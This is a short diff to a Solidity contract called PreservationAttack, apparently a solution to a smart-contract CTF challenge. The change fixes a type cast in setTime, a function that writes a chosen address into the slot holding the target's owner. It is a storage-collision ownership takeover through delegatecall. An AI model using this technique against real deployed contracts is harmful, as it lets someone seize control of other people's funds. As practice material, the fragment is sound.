@@ -8,8 +8,8 @@ contract PreservationAttack {
   address slot1; 
   address ownerSlot;
 
-  function setTime(uint160 addressAsUint) public {
+  function setTime(uint256 addressAsUint) public {
     // Sets the owner
-    ownerSlot = address(addressAsUint);
+    ownerSlot = address(uint160(addressAsUint));
   }
 }
